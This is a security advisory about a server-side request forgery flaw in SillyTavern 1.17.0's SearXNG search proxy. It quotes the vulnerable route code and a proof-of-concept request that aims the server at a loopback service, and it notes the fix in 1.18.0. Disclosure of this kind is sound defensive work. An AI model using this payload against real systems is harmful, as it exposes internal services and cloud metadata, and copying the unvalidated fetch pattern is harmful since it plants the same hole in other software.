summary: "SillyTavern: SSRF in SearXNG Search Proxy via Unvalidated baseUrl\n## Resolution\n\
  \nSillyTavern 1.18.0 added a generic server-side request filter (Private Request Whitelisting).\
  \ Since we expect users to use the application in a trusted environment, the filter is disabled\
  \ by default, however it is strongly advised to be enabled and properly configured when an\
  \ instance is being hosted over a network, as suggested by a console warning message and an\
  \ officially published security checklist for administrators.\n\nDocumentation: \n\n- https://docs.sillytavern.app/administration/config-yaml/#private-address-whitelisting\n\
  - https://docs.sillytavern.app/administration/#security-checklist\n\n## Note on future SSRF\
  \ findings\n\nSince the request filter applies to the entire application, no SSRF vulnerabilities\
  \ against individual endpoints will be accepted, unless it has been proven that a properly\
  \ configured and enabled filter can be bypassed in an undocumented way. Only advisories disclosed\
  \ before the 1.18.0 release will be posted if their concern is SSRF.\n\n## Summary\nSillyTavern\
  \ 1.17.0 exposes `/api/search/searxng`, which accepts attacker-controlled `baseUrl` and uses\
  \ it directly to build outbound server-side fetches. An authenticated low-privilege user can\
  \ point `baseUrl` at an internal or loopback HTTP service and receive the `/search` response\
  \ body.\n\nConfirmed version: SillyTavern 1.17.0 from the audited source tree. Broader affected\
  \ versions and patched versions should be confirmed by the maintainer.\n\n## Details\nThe\
  \ `/api/search/searxng` route in `src/endpoints/search.js` reads `baseUrl` from `request.body`\
  \ and performs no allowlist, IP range, DNS, or scheme validation before making outbound requests.\n\
  \nCore vulnerable path:\n\n```js\nrouter.post('/searxng', async (request, response) => {\n\
  \    const { baseUrl, query, preferences, categories } = request.body;\n    if (!baseUrl ||\
  \ !query) {\n        return response.status(400).send('Missing required parameters');\n  \
  \  }\n\n    const mainPageUrl = new URL(baseUrl);\n    const mainPageRequest = await fetch(mainPageUrl,\
  \ { headers: visitHeaders });\n    ...\n    const searchUrl = new URL('/search', baseUrl);\n\
  \    const searchParams = new URLSearchParams();\n    searchParams.append('q', query);\n \
  \   ...\n    const searchResult = await fetch(searchUrl, { headers: visitHeaders });\n   \
  \ ...\n    const data = await searchResult.text();\n    return response.send(data);\n});\n\
  ```\n\n`src/server-startup.js` mounts this router at `/api/search`, and `src/server-main.js`\
  \ applies login middleware before the API routes. This means the source is a remote authenticated\
  \ POST request and the sink is server-side `fetch()` to attacker-selected hosts.\n\n## PoC\n\
  Attacker prerequisites: a valid SillyTavern web session, or access to a deployment where user\
  \ accounts are disabled.\n\nStart an internal mock service on the target host:\n\n```js\n\
  import http from 'node:http';\n\nhttp.createServer((req, res) => {\n  if (req.url === '/')\
  \ {\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    return res.end('<html><head><link\
  \ href=\"/client.css\" rel=\"stylesheet\"></head></html>');\n  }\n  if (req.url === '/client.css')\
  \ {\n    res.writeHead(200, { 'Content-Type': 'text/css' });\n    return res.end('body{}');\n\
  \  }\n  if (req.url.startsWith('/search?q=')) {\n    res.writeHead(200, { 'Content-Type':\
  \ 'text/plain' });\n    return res.end('INTERNAL-SEARCH-RESULT');\n  }\n  res.writeHead(404);\n\
  \  res.end('not found');\n}).listen(9091, '127.0.0.1');\n```\n\nThen send:\n\n```http\nPOST\
  \ /api/search/searxng HTTP/1.1\nHost: TARGET:8000\nCookie: session-...=...\nX-CSRF-Token:\
  \ <token from /csrf-token>\nContent-Type: application/json\n\n{\"baseUrl\":\"http://127.0.0.1:9091/\"\
  ,\"query\":\"x\"}\n```\n\nResult based on the route logic: SillyTavern first fetches `http://127.0.0.1:9091/`,\
  \ then fetches `http://127.0.0.1:9091/search?q=x`, and returns `INTERNAL-SEARCH-RESULT` to\
  \ the attacker.\n\n## Impact\nThis is an authenticated SSRF primitive with arbitrary host\
  \ and port selection. It can disclose responses from loopback or internal HTTP services reachable\
  \ from the SillyTavern host and may enable interaction with internal admin panels, development\
  \ services, cloud metadata endpoints in applicable deployments, or service discovery across\
  \ private networks."
